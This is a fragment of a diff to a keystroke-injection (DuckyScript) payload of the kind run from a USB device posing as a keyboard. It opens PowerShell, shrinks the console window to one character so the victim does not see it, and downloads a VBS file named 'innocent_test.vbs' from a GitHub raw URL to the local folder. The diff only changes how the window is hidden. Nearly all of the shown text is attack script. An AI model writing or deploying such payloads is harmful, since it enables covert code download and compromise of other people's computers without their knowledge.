@@ -7,16 +7,8 @@ ALT D
 DELAY 20
 STRINGLN POWERSHELL.exe 
 DELAY 100
-ALT SPACE
-STRING m
-VAR $i = 0
-WHILE ( $i < 50 )
-  LEFTARROW
-END_WHILE
-STRING [console]::WindowHeight=1
-ENTER
-STRING [console]::WindowWidth=1
-ENTER
+STRINGLN [console]::WindowHeight=1
+STRINGLN [console]::WindowWidth=1
 DELAY 200
 STRINGLN Invoke-WebRequest -Uri https://raw.githubusercontent.com/Fred-the-bot/payloads/main/innocent_test.vbs -OutFile .\innocent.vbs
 DELAY 1000
